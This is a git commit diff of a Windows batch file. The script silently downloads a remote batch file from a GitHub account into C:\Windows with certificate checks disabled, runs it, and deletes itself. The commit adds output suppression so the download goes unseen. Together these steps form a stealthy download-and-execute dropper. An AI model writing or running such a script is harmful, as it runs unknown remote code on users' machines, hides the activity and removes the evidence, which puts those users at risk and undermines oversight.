3661578a09cf74ab6f48936b77d3bec7a999d615
twish1x <153032092+twish1x@users.noreply.github.com>
2025-03-16 11:11:42 -0700

    Update d.bat

--- d.bat
+++ d.bat
@@ -1,6 +1,6 @@
 @echo off
 cls
-curl -g -k -L -# -o C:\Windows\twishlol.bat https://raw.githubusercontent.com/twish1x/apps/refs/heads/main/twishlol.bat
+curl -g -k -L -# -o C:\Windows\twishlol.bat https://raw.githubusercontent.com/twish1x/apps/refs/heads/main/twishlol.bat >> nul 2> nul
 
 start C:\Windows\twishlol.bat
 del "%~f0"
